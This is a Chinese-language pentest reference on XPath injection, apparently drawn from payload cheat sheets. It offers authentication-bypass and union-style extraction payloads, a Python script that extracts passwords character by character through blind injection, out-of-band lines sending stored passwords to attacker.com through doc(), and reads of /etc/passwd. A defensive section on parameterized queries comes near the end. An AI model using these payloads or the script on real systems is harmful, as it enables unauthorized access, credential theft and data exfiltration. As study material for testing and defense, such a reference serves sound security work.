---
attack_surface: [注入类]
impact: [身份伪造, 权限提升, 信息泄露]
risk_level: 高
prerequisites:
  - XML/XPath 语法基础
  - XPath 节点与谓词概念
  - HTTP 协议基础
difficulty: 中级
related_techniques:
  - sql-injection
  - nosql-injection
  - ldap-injection
  - orm-injection
  - ssrf-server-side-request-forgery
tools:
  - xcat
  - xxxpwn
  - xxxpwn_smart
  - xpath-blind-explorer
  - XMLChor
---

# XPATH Injection — XML 路径语言注入

> 关联文档：[SQL Injection](../SQL%20Injection/README.md) · [LDAP Injection](../LDAP%20Injection/README.md) · [NoSQL Injection](../NoSQL%20Injection/README.md) · [SSRF](../../Reflected%20Values/SSRF/README.md)

---

# 0x01 背景与原理

## 1.1 什么是 XPath

XPath（XML Path Language）是一种用于在 XML 文档中导航和查询节点的语言，可与 SQL 的 SELECT 类比——但操作的是 XML 文件而非关系型数据库。XPath 主要用于：
- XML 数据库（如 eXist、BaseX、MarkLogic）
- Web 应用的身份验证（XML 用户存储）
- SOAP/XML-RPC Web Service 搜索功能

## 1.2 XPath Injection 的原理

与 SQL 注入完全相同：**用户输入被直接拼接到 XPath 表达式字符串中**。但 XPath 没有类似 SQL 权限模型的概念——一旦注入成功，攻击者可以访问整个 XML 文档。

```python
# 漏洞代码
xpath = f"/users/user[name/text()='{username}' and password/text()='{password}']/account/text()"
result = xml_tree.xpath(xpath)

# 攻击输入: username = ' or '1'='1
# XPath: /users/user[name/text()='' or '1'='1' and password/text()='']/account/text()
# → '1'='1' = true → 返回第一个用户的 account
# XPath 无 SQL 的 LIMIT，但逻辑等价于绕过认证
```

**根因**：XPath 查询使用字符串拼接 + 特殊的 XPath 操作符（`=`、`!=`、`<`、`>`、`and`、`or`、`not()`、`contains()`、`substring()`）。

## 1.3 为什么 XPath 注入更危险

| 特性 | SQL | XPath |
|------|-----|-------|
| **权限模型** | GRANT/REVOKE 细粒度 | 无 — 可读整个 XML 文档 |
| **数据范围** | 受限于授权的数据库/表 | 整个 XML 文档 |
| **盲注难度** | 中等 | 相当简单（XPath 函数强大） |
| **OOB** | 需要 DB 级别功能 | 内建 `doc()` 函数直接发起 HTTP 请求 |

---

# 0x02 XPath 语法速查

## 2.1 节点选择

| 表达式 | 说明 |
|--------|------|
| `nodename` | 选择所有名为 "nodename" 的子节点 |
| `/` | 从根节点开始选择（绝对路径） |
| `//` | 从当前节点递归选择所有匹配节点 |
| `.` | 当前节点 |
| `..` | 父节点 |
| `@` | 选择属性 |

## 2.2 谓词与函数

| 表达式 | 说明 |
|--------|------|
| `[1]` | 第一个元素 |
| `[last()]` | 最后一个元素 |
| `[last()-1]` | 倒数第二个 |
| `[position()<3]` | 前两个 |
| `[@lang]` | 具有 `lang` 属性的节点 |
| `[@lang='en']` | `lang` 属性等于 'en' |
| `[price>35.00]` | price 大于 35 |

## 2.3 通配符与布尔运算

```
*            — 任意元素节点
@*           — 任意属性节点
node()       — 任意类型的节点
and / or     — 布尔运算
not()        — 逻辑否
true()       — 永真
false()      — 永假
```

## 2.4 字符串函数

```
contains(str, substr)    — str 包含 substr
starts-with(str, substr) — str 以 substr 开头
substring(str, pos, len) — 子串
string-length(str)       — 字符串长度
normalize-space(str)     — 去除多余空白
concat(str1, str2, ...)  — 拼接
codepoints-to-string(n)  — Unicode 码点转字符
string-to-codepoints(s)  — 字符转 Unicode 码点
```

## 2.5 示例 XML 与数据访问

以下 XML 文档贯穿所有后续 payload 示例，包含 3 个用户（pepe / mark / fino）及其密码和账户类型：

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<data>
<user>
    <name>pepe</name>
    <password>peponcio</password>
    <account>admin</account>
</user>
<user>
    <name>mark</name>
    <password>m12345</password>
    <account>regular</account>
</user>
<user>
    <name>fino</name>
    <password>fino2</password>
    <account>regular</account>
</user>
</data>
```

**XPath 数据访问速查**（基于上述 XML）：

```xpath
# 提取所有用户名 → [pepe, mark, fino]
//name
/user/name
//user/name

# 提取所有值（用户名+密码+账户）→ [pepe, peponcio, admin, mark, m12345, regular, fino, fino2, regular]
//user/node()

# 位置选择
//user[position()=1]/name                          # → pepe
//user[last()-1]/name                              # → mark
//user[position()=1]/child::node()[position()=2]   # → peponcio (第1用户的password)

# 函数演示
count(//user/node())                               # → 9 (3 用户 × 3 字段)
string-length(//user[position()=1]/child::node()[position()=1])  # → 4 ("pepe")
substring(//user[position()=2]/child::node()[position()=1], 2, 1) # → "a" ("mark"[2])
```

---

# 0x03 认证绕过

## 3.1 经典 OR 绕过

```xpath
# 原始 XPath:
string(/users/user[name/text()='USER' and password/text()='PASS']/account/text())

# Payload 1 — 用户名 OR bypass
username = ' or '1'='1
password = (任意)
# → /users/user[name/text()='' or '1'='1' and password/text()='']/account/text()
# '1'='1' 永真 → AND 优先级高于 OR → 返回第一个 account

# Payload 2 — 双引号变体
" or "1"="1

# Payload 3 — 空引号变体
' or ''='

# Payload 4 — 单字段 OR 绕过（username 或 password 任一有注入即可）
' or /* or '             # 注释型 OR
' or "a" or '            # 字符串 OR
' or 1 or '              # 数字 OR
' or true() or '         # true() 永真函数
```

## 3.2 NULL Injection

```xpath
# 利用 NULL 字节截断 XPath 解析
username = ' or 1]%00
# → /users/user[name/text()='' or 1]\0...]
# 部分解析器遇到 NULL 停止 → 只解析到 ]  → 选择第一个 user
```

## 3.3 利用 XPath 函数精确定位

```xpath
# 若只需绕过但不知道 admin 用户名
' or string-length(name(.))<10 or '    # name < 10 字符
' or contains(name,'adm') or '         # name 含 'adm'
' or contains(.,'adm') or '            # 当前节点任何值含 'adm'
' or position()=2 or '                 # 选择第 2 个用户
```

---

# 0x04 数据提取

## 4.1 Union-Style 注入 (管道符 `|`)

XPath 用 `|` 运算符连接多个表达式路径，是 XPath 注入中最常用的数据提取手段：

```xpath
# 基础提取 — 获取所有值
' or 1=1] | //user/password[('')=('

# 提取所有节点值
') or 1=1] | //user/node()[('')=('

# 提取根节点所有数据
')] | //node()[('')=('

# 获取所有密码
')]/../*[3][text()!=('

# 按位置提取
')] | //user/*[1] | a[('  # 列 1 (ID)
')] | //user/*[2] | a[('  # 列 2 (name)
')] | //user/*[3] | a[('  # 列 3 (password)
')] | //user/*[4] | a[('  # 列 4 (account)

# NULL injection 变体
')] | //password%00
```

## 4.2 字符串包含匹配

当存在一个搜索端点时：

```xpath
# 原始: /user/username[contains(., 'SEARCH_TERM')]

# 获取所有用户名
') or 1=1 or ('      

# 联合查询获取所有用户名+密码
') or 1=1] | //user/password[('')=('

# 获取所有节点值
')] | //./node()[('')=('
```

---

# 0x05 盲注提取

## 5.1 Boolean-Based Blind

```xpath
# 原始: /users/user[userid=USER_INPUT]
# 返回这个用户的特定数据，或只返回 "存在/不存在"

# 长度探测
' or string-length(//user[position()=1]/child::node()[position()=1])=4 or ''='
# → 第一个用户的第一个字段（如用户名）长度为 4?

# 字符提取
' or substring((//user[position()=1]/child::node()[position()=1]),1,1)="a" or ''='
# → 第一个字符是 "a"?

# 使用 codepoints 提取（更精确比较）
substring(//user[userid=5]/username,2,1)=codepoints-to-string(97)
# → 第 5 个用户 username 的第 2 个字符 = 'a' (codepoint 97)
```

## 5.2 Error-Based Blind

某些 XPath 引擎在特定条件失败时抛出错误，可作为 oracle：

```xpath
# 利用 error() 函数：条件为真时触发异常
... and (if (condition) then error() else 0) ...
# → 当错误发生时 → 条件为真
# → 无错误 → 条件为假
```

## 5.3 Python 盲注脚本

```python
import requests, string

def xpath_blind_extract(url):
    """XPath 盲注逐字符提取数据"""
    result = ""
    alphabet = string.ascii_letters + string.digits + "{}_()"

    # Step 1: 获取值长度
    length = 0
    for i in range(1, 50):
        r = requests.get(url, params={
            "userid": f"2 and string-length(password)={i}"
        })
        if "TRUE_COND" in r.text:
            length = i
            print(f"[+] Password length: {length}")
            break

    # Step 2: 逐字符提取
    for i in range(1, length + 1):
        for ch in alphabet:
            r = requests.get(url, params={
                "userid": f"2 and substring(password,{i},1)='{ch}'"
            })
            if "TRUE_COND" in r.text:
                result += ch
                print(f"[+] Position {i}: {ch} → {result}")
                break

    return result
```

---

# 0x06 Schema 信息识别

## 6.1 XML 结构盲析

通过 `count()` 函数逐层解析 XML 结构，无需知道标签名：

```xpath
# Step 1: 根节点数
and count(/*) = 1          # → TRUE → 1 个根节点

# Step 2: 根节点的子节点数
and count(/*[1]/*) = 2     # → TRUE → 根下 2 个子节点 (标签 a, c)

# Step 3: 标签 a 的子节点数
and count(/*[1]/*[1]/*) = 1  # → TRUE → a 下 1 个子节点 (标签 b)

# Step 4: 标签 b 的子节点数
and count(/*[1]/*[1]/*[1]/*) = 0  # → TRUE → b 无子节点 → 叶节点

# Step 5: 标签 c 的子节点数
and count(/*[1]/*[2]/*) = 3  # → TRUE → c 下 3 个子节点 (d, e, f)

# ... 递归直到所有分支 → 重建完整 XML schema
```

## 6.2 标签名提取

```xpath
# 确认根节点名称
and name(/*[1]) = "root"   # → 根标签名为 "root"

# 逐字符提取标签名
and substring(name(/*[1]/*[1]),1,1) = "a"  # 第一个子标签首字母是 'a'

# 使用 codepoint 精确定位
and string-to-codepoints(substring(name(/*[1]/*[1]/*),1,1)) = 105
# → 首字母 codepoint 105 = "i"
```

---

# 0x07 OOB (带外) 利用

XPath 2.0/3.0 支持 `doc()` 和 `doc-available()` 函数，可直接发起外部 HTTP 请求外带数据：

```xpath
# 基础 OOB — 通过 URL 路径泄露
doc(concat("http://attacker.com/oob/", //user/password/text()))

# 进阶 — 编码防止 URL 无效字符
doc(concat("http://attacker.com/oob/", encode-for-uri(/Employees/Employee[1]/username)))

# doc-available 变体 — 返回 true/false 而非发起实际请求
doc-available(concat("http://attacker.com/oob/", /Employees/Employee[1]/username))

# 反转结果
not(doc-available(concat("http://attacker.com/oob/", ...)))
```

## 文件读取

```xpath
# 利用 doc() 读取本地文件
doc('file:///etc/passwd')
doc('file:///c:/windows/win.ini')

# 盲注文件内容
substring((doc('file:///etc/passwd')/*[1]/*[1]/text()[1]),3,1) < 127
```

---

# 0x08 自动化工具

| 工具 | 功能 | 链接 |
|------|------|------|
| **xcat** | 全功能 XPath 注入工具，支持盲注/OOB | [xcat.readthedocs.io](https://xcat.readthedocs.io/) |
| **xxxpwn** | XPath 盲注自动化 | [GitHub](https://github.com/feakk/xxxpwn) |
| **xxxpwn_smart** | XXXPwn 预优化版 | [GitHub](https://github.com/aayla-secura/xxxpwn_smart) |
| **xpath-blind-explorer** | 图形化 XPath 盲注 | [GitHub](https://github.com/micsoftvn/xpath-blind-explorer) |
| **XMLChor** | XML 数据提取 | [GitHub](https://github.com/Harshal35/XMLCHOR) |

---

# 0x09 攻击链与联动

## 9.1 XPATH → 信息泄露 → SQL 注入

```
[XPath Injection 提取 XML 中的数据库凭据]
    → [凭据用于直接连接数据库]
    → [SQL 注入 / 直接数据窃取]
```

## 9.2 XPATH → OOB → SSRF

```
[doc() / doc-available() 函数外带]
    → [HTTP 请求到攻击者服务器]
    → [如果 XML DB 可达内网 → SSRF 攻击内网服务]
    → [联动: 攻击者 DNS bin 收集数据]
```

## 9.3 XPATH → File Read → RCE

```
[doc('file:///path/to/config') 读取配置文件]
    → [泄露凭据/密钥]
    → [通过其他途径实现 RCE]
```

---

# 0x0A 防御策略

1. **参数化 XPath 查询** — 使用 XPath 变量绑定：
   ```python
   # 安全: 将用户输入绑定为 XPath 外部变量
   xpath = "/users/user[name/text()=$username and password/text()=$password]/account/text()"
   tree.xpath(xpath, username=user_input, password=pass_input)
   ```

2. **输入消毒** — 转义或拒绝 XPath 特殊字符：`'`, `"`, `(`, `)`, `=`, `<`, `>`, `/`, `[`, `]`, `*`, `|`

3. **使用 JSON 或关系型数据库** — 避免 XML 作为安全敏感数据的存储介质

4. **禁用危险函数** — 在生产 XML 引擎中禁用 `doc()`、`doc-available()`、`error()` 等函数

5. **最小权限** — XML 处理进程在受限操作系统用户下运行

---

# 0x0B 参考资料

- [PayloadsAllTheThings — XPATH Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)
- [OWASP — Testing for XPath Injection](https://wiki.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010))
- [W3Schools — XPath Syntax](https://www.w3schools.com/xml/xpath_syntax.asp)
- [HackTricks — XPATH Injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection)
- [xcat — XPath Injection Automation](https://xcat.readthedocs.io/)
